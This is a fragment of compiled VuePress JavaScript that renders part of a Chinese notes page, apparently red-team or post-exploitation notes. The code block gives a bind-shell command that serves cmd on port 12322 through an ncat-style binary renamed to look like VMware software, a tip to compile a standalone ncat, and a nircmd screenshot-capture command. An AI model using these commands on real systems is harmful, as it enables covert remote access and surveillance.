\"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\")])]),t(\"ol\",{attrs:{start:\"8\"}},[t(\"li\",[s._v(\"其它\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-bash line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-bash\"}},[t(\"code\",[s._v(\"丢失 msvcr120.dll\\n\\nvnetlib.exe -c vnetlib.ini \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"&\")]),s._v(\" vhosts.exe --allow  \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1 -l \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"12322\")]),s._v(\" -c cmd\\n\\n自行从nmap官网下载ncat编译，不依赖其他dll文件\\n\\nnircmd 功能强大的软件\\n\\nnircmd.exe savescreenshot screenhotfilename.png\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"9\")]),t(\"br\")])])])}),[],!1,null,null,null);a.default=e.exports}}]);","extractedComments":[]}